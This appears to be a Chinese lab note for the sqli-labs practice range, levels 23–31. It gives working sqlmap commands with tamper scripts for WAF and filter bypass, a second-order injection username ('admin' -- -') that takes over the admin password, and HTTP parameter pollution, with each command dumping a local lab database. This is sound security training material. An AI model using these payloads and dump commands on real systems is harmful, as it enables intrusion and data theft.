# WAF/过滤绕过关卡 (Less-23 ~ Less-31)

## 绕过类型对照

| Less | 方法 | 过滤内容 | 绕过方式 |
|------|------|---------|---------|
| 23 | GET + 单引号 | 注释符 `--`, `#` | `--tamper=space2comment` |
| 24 | POST | 二次注入（存储型） | sqlmap 不支持，需手动利用 |
| 25 | GET + 单引号 | `OR` / `AND` 关键字 | `--tamper=space2comment` |
| 25a | GET + 数字型 | `OR` / `AND` 关键字 | `--tamper=space2comment` |
| 26 | GET + 单引号 | 空格 + 注释符 | `--tamper=space2comment,randomcomments` |
| 26a | GET + 单引号+括号 | 空格 + 注释符 | `--tamper=space2comment,randomcomments` |
| 27 | GET + 双引号 | `SELECT`/`UNION` 等关键字 | `--tamper=space2comment` |
| 27a | GET + 双引号+括号 | `SELECT`/`UNION` 等关键字 | `--tamper=space2comment` |
| 28 | GET + 单引号+括号 | 注释符 | `--tamper=space2comment` |
| 28a | GET + 双引号+括号 | 注释符 | `--tamper=space2comment` |
| 29 | GET + 单引号 | 双重参数 (HPP) | URL 传两个同名参数 |
| 30 | GET + 双引号 | 双重参数 (HPP) | URL 传两个同名参数 |
| 31 | GET + 双引号+括号 | 双重参数 (HPP) | URL 传两个同名参数 |

## 关键知识

### Less-24 二次注入（sqlmap 不支持）

```
攻击流程：
1. 注册用户名为 "admin' -- -" 的账号（恶意用户名存入数据库）
2. 登录后修改密码，后端执行：
   UPDATE users SET password='newpass' WHERE username='admin' -- -'
3. 注释截断了 WHERE 条件，实际修改了 admin 的密码
```

sqlmap 无法自动完成上述两步操作，需手工利用。

### HPP（HTTP Parameter Pollution，Less 29-31）

WAF 检查第一个参数，后端取第二个参数：
```
?id=1&id=2
   ↑     ↑
  WAF  后端实际取值
  检查
```

## 配置

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行命令

### Less-23: 注释过滤

```bash
sqlmap -u "$TARGET/Less-23/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-23"
```

### Less-24: 二次注入

> 本关 sqlmap 默认不支持，需手动利用。以下命令仅供参考。

```bash
# 步骤1：注册恶意用户名
# 用户名: admin' -- -
# 密码: 任意

# 步骤2：用该用户登录后修改密码，触发 UPDATE 注入

# sqlmap 无法自动完成，命令已注释
# sqlmap -u "$TARGET/Less-24/" \
#     --data="uname=admin&passwd=admin" \
#     --batch --random-agent --threads=8 --dbms=mysql \
#     --dump --output-dir="$RESULTS_DIR/Less-24"
```

### Less-25: OR/AND 过滤

```bash
sqlmap -u "$TARGET/Less-25/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-25"
```

### Less-25a: 数字型 + OR/AND 过滤

```bash
sqlmap -u "$TARGET/Less-25a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-25a"
```

### Less-26: 空格/注释过滤

```bash
sqlmap -u "$TARGET/Less-26/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment,randomcomments \
    --dump --output-dir="$RESULTS_DIR/Less-26"
```

### Less-26a: 单引号+括号 + 空格/注释过滤

```bash
sqlmap -u "$TARGET/Less-26a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment,randomcomments \
    --dump --output-dir="$RESULTS_DIR/Less-26a"
```

### Less-27: 关键字过滤

```bash
sqlmap -u "$TARGET/Less-27/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-27"
```

### Less-27a: 双引号+括号 + 关键字过滤

```bash
sqlmap -u "$TARGET/Less-27a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-27a"
```

### Less-28: 单引号+括号 + 注释过滤

```bash
sqlmap -u "$TARGET/Less-28/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-28"
```

### Less-28a: 双引号+括号 + 注释过滤

```bash
sqlmap -u "$TARGET/Less-28a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-28a"
```

### Less-29: 双重参数 (HPP)

```bash
sqlmap -u "$TARGET/Less-29/?id=1&id=2" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-29"
```

### Less-30: 双引号 + 双重参数

```bash
sqlmap -u "$TARGET/Less-30/?id=1&id=2" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-30"
```

### Less-31: 双引号+括号 + 双重参数

```bash
sqlmap -u "$TARGET/Less-31/?id=1&id=2" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-31"
```

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [注入类型详解](../notes/injection-types.md) | [靶场总览](../notes/overview.md)
